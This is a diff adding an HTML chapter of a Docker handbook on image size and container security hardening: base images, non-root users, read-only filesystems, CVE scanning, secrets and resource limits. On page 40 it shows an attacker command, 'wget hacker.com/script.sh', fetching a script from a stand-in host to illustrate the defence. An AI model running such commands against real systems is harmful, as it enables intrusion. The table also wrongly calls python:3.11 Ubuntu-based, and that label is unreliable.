@@ -1,0 +1,167 @@
+<div class="page" id="chapter-13">
+    <div class="header">CHAPTER 13 — Performance, Size & Security</div>
+
+    <h2 style="margin-top: 0;">CHAPTER 13 — Performance, Size & Security</h2>
+
+    <h3>Choosing the Right Base Image</h3>
+    <p>The foundation of every container is its base image. Choosing the wrong base image is the #1 cause of slow
+        deployments and critical security vulnerabilities in our production environment.</p>
+
+    <ul>
+        <li><strong>ubuntu:</strong> The absolute largest and heaviest base line. Includes massive unneeded utilities.
+            Never use this for production apps.</li>
+        <li><strong>debian-slim:</strong> An excellent, highly-compatible compromise. It strips out unneeded
+            documentation and extra tools but keeps the standard safe C libraries (glibc).</li>
+        <li><strong>alpine:</strong> Extremely tiny. It replaces standard GNU C libraries with <code>musl libc</code>.
+            While tiny, this is notoriously known for breaking Python C-bindings (like pandas or bcrypt). Proceed with
+            caution in interpreted languages!</li>
+        <li><strong>distroless:</strong> The ultimate security pinnacle. Created by Google, it contains absolutely ZERO
+            shell environment (no `bash`, no `ls`, no `cd`). It ONLY contains our application. If a hacker breaches our
+            app, they have no terminal to explore our system.</li>
+    </ul>
+
+    <h3>Image Size Comparison</h3>
+    <table class="reference-table">
+        <tr>
+            <th>Base Image</th>
+            <th>Starting Size</th>
+            <th>Primary Use Case</th>
+        </tr>
+        <tr>
+            <td><code>python:3.11</code> (Ubuntu-based)</td>
+            <td>~900 MB</td>
+            <td>Local debugging or complex data science apps requiring heavy C++ compilers.</td>
+        </tr>
+        <tr>
+            <td><code>python:3.11-slim</code></td>
+            <td>~120 MB</td>
+            <td><strong>The default golden standard for production web apps.</strong></td>
+        </tr>
+        <tr>
+            <td><code>python:3.11-alpine</code></td>
+            <td>~50 MB</td>
+            <td>Ultra-lean microservices (but watch out for C-binding build errors).</td>
+        </tr>
+        <tr>
+            <td><code>gcr.io/distroless/python3</code></td>
+            <td>~50 MB</td>
+            <td>Maximum security. No shell access available.</td>
+        </tr>
+    </table>
+
+    <div class="footer">
+        <span>Docker Complete Handbook</span>
+        <span>Page 39</span>
+    </div>
+</div>
+
+<!-- Chapter 13 Page 2 -->
+<div class="page">
+    <div class="header">CHAPTER 13 — Performance, Size & Security</div>
+
+    <h3>The <code>USER</code> Instruction (Non-Root Magic)</h3>
+    <p>By default, the process running inside every Docker container executes as the <code>root</code> user (User ID 0).
+        This means if a hacker exploits an upload vulnerability in our app, they instantly own the container with
+        maximum privileges.</p>
+
+    <p>We <strong>must ALWAYS</strong> create a restricted user and downgrade our privileges before booting our app.</p>
+
+    <pre><code>FROM node:20-alpine
+WORKDIR /app
+COPY . .
+RUN npm ci
+
+# The node alpine image handily comes with a pre-created 
+# restricted user simply named 'node'. We switch to it:
+USER node
+
+# Our app now boots with zero root permissions
+CMD ["npm", "start"]</code></pre>
+
+    <h3>Read-Only Filesystems</h3>
+    <p>Hackers love to download their malicious cryptomining scripts directly into our container's temporary
+        directories. We can mathematically prevent this by telling Docker to boot the container perfectly Read-Only.</p>
+
+    <div class="usage-box">
+        <code>docker run --read-only my-app</code><br>
+        Now, if a hacker manages to execute <code>wget hacker.com/script.sh</code> inside our app, the Linux kernel will
+        aggressively block the download with a <strong>Read-Only Filesystem</strong> error.
+    </div>
+
+    <p>If our app dynamically needs to write files (like uploading avatars), we explicitly map a specific
+        <code>tmpfs</code> or Named Volume strictly just for that directory.</p>
+
+    <div class="footer">
+        <span>Docker Complete Handbook</span>
+        <span>Page 40</span>
+    </div>
+</div>
+
+<!-- Chapter 13 Page 3 -->
+<div class="page">
+    <div class="header">CHAPTER 13 — Performance, Size & Security</div>
+
+    <h3>Vulnerability Scanning (Docker Scout)</h3>
+    <p>We should never blindly trust public images. Vulnerabilities (CVEs) are discovered constantly. Docker provides a
+        built-in security scanner to analyze our layers before we deploy.</p>
+
+    <pre><code># Scan our newly built image against the live global CVE database
+docker scout cves my-app:latest</code></pre>
+
+    <p>This command outputs a detailed breakdown of exactly which layer and which specific apt/npm/pip package
+        introduces a Critical, High, or Medium vulnerability, and crucially, gives us the exact upgraded version number
+        required to patch it.</p>
+
+    <h3>Secrets Management</h3>
+    <div class="mistake-box">
+        <strong>⚠️ The Permanent Secret Trap:</strong><br>
+        If we write <code>ENV AWS_KEY=12345</code> or <code>COPY .env .</code> in our Dockerfile, that secret is
+        permanently baked into the image history block forever. Even if we explicitly say <code>RUN rm .env</code> in
+        the very next line, an attacker can simply reverse-engineer the previous layer and read our keys.
+    </div>
+
+    <p><strong>The Rule: NEVER BAKE SECRETS.</strong> All secrets must be injected dynamically at <em>runtime</em> using
+        Docker Compose `env_file:` or cloud secrets managers (like AWS Parameter Store or Kubernetes Secrets).</p>
+
+    <div class="footer">
+        <span>Docker Complete Handbook</span>
+        <span>Page 41</span>
+    </div>
+</div>
+
+<!-- Chapter 13 Page 4 -->
+<div class="page">
+    <div class="header">CHAPTER 13 — Performance, Size & Security</div>
+
+    <h3>Imposing Resource Limits</h3>
+    <p>A single buggy Docker container caught in an infinite `while(true)` loop can accidentally consume 100% of our
+        host server's CPU and RAM, starving every other application to death.</p>
+
+    <p>We must explicitly sandbox the resources available to our containers.</p>
+
+    <pre><code># Limit to 512 Megabytes of RAM and exactly half of one CPU core
+docker run -d --memory="512m" --cpus="0.5" my-app</code></pre>
+
+    <p>In Docker Compose, this is translated to the <code>deploy</code> block:</p>
+    <pre><code>services:
+  api:
+    image: my-app
+    deploy:
+      resources:
+        limits:
+          cpus: '0.5'
+          memory: 512M</code></pre>
+
+    <h3>Revisiting <code>.dockerignore</code></h3>
+    <p>We discussed it in Chapter 5, but its security impact cannot be overstated. A missing <code>.dockerignore</code>
+        is the single most common reason entire <code>.git/</code> directories (containing git history and sensitive
+        configuration) or local <code>.env</code> files accidentally get uploaded to public Docker Registries.</p>
+    <p>Before launching to production, we must manually run an interactive bash shell
+        (<code>docker run -it my-app bash</code>) and manually inspect our root directory to ensure exactly zero garbage
+        files made it into the final image.</p>
+
+    <div class="footer">
+        <span>Docker Complete Handbook</span>
+        <span>Page 42</span>
+    </div>
+</div>
